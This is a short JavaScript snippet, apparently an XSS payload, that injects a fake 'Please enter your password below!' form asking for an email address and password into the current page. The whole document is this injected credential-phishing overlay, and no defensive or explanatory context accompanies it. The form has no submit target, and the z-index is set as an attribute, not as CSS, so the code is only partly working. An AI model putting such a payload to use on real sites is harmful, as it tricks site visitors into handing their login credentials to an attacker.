const box = document.createElement('div')
box.innerHTML = `
<p>Please enter your password below!</p>

	<form>
		<div>
			<input type="text" class="" placeholder="Email address">
			<input type="password" class="" placeholder="Password">
			<button id="xssbutton" type="submit" class="">Submit</button>
		</div>
	</form>
  
`;
box.setAttribute("z-index", "99999");
document.body.appendChild(box);
